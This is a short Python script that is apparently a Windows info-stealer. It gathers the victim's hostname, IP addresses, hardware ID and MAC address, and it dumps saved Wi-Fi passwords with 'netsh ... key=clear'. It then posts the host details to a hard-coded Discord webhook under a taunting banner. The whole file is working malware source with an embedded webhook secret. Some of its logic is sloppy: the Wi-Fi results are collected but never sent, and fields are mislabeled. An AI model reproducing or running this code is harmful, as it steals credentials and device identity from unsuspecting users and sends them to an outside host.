import json
import requests
import time
import socket
import subprocess
import uuid
hwid = uuid.getnode()
mac_address = ':'.join(['{:02x}'.format((hwid >> i) & 0xff) for i in range(0, 48, 8)])
computer_name = socket.gethostname()
private_ip = socket.gethostbyname(socket.gethostname())
public_ip = socket.gethostbyname(socket.getfqdn())
token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"

def wifistealer():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    results = ""
    for i in profiles:
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            output = [b.split(":")[1][1:-1] for b in output if "Key Content" in b]
            results += f"{i}: {output[0]}\n"
        except IndexError:
            results += f"{i}: \n"
    
    return results

wifistolen = wifistealer()

embed = {
    "title": "BOOM, HEADSHOT!",
    "description": computer_name,
    "color": 16711680,
    "fields": [
        {
            "name": "IP Addresses",
            "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
            "inline": False
        },
        {
            "name": "Device Details",
            "value": f"Public IP: {hwid}\nPrivate IP: {mac_address}",
            "inline": True
        }
    ],
    "footer": {
        "text": "360 FUCKING NOSCOPED!",
        "icon_url": "https://imgur.com/jWr67J8"
    }
}

payload = {
    "username": "",
    "embeds": [
        embed
    ]
}
headers = {
    "Content-Type": "application/json"
}

# Send the webhook
response = requests.post(token, data=json.dumps(payload), headers=headers)

# Check the response
if response.status_code == 204:
    time.sleep(0)
else:
    print(f"Critical Error!: {response.status_code}")
